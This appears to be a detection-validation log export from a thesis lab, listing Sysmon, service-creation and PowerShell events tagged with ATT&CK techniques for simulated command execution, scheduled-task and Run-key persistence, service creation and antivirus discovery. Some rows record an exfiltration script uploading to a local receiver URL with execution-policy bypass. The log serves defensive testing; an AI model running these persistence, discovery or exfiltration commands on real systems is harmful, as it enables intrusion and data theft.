2026-06-24T12:53:48.413Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P3	TEC-005	T1569.002	TEC-005 Windows service creation	TEC005_Service_System7045	LT29.ait.us.es	System	{ "ServiceName": "TFM TEC005 Test Service", "ImagePath": "C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt", "ServiceType": "servicio de modo usuario", "StartType": "inicio por solicitud", "AccountName": "LocalSystem" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	System 7045	05_LOGS\Validas\Prueba_24_06_2026\TEC005_Service_System7045-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.900Z	P3	TEC-006	T1518.001	TEC-006 Security Software Discovery	TEC006_SecuritySoftwareDiscovery_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:16.265Z	P3	TEC-006	T1518.001	TEC-006 Security Software Discovery	TEC006_SecuritySoftwareDiscovery_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
